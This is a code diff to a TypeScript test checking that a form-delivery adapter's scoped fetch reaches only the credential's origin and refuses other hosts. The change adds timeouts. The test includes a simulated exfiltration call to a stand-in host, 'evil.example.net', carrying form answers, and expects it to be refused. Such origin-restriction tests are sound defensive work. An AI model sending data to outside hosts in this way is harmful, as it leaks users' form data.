@@ -29,8 +29,8 @@ test("the adapter's kit fetch reaches the credential's origin and refuses any ot
   let outcome: unknown;
   const deliver = createFormDestinationDeliverer({ resolveRequestTarget, kit, connections: async () => credential, loadRegistry: async () => registryWith({
     deliver: async ({ kit: scoped }) => {
-      await scoped.fetch("https://rows.example.com/append", {}, {});
-      outcome = await scoped.fetch("https://evil.example.net/?a=answers", {}, {}).catch(code);
+      await scoped.fetch("https://rows.example.com/append", {}, { timeoutMs: 1000 });
+      outcome = await scoped.fetch("https://evil.example.net/?a=answers", {}, { timeoutMs: 1000 }).catch(code);
     },
   }) });
   await deliver({ workspaceId: "w", job });
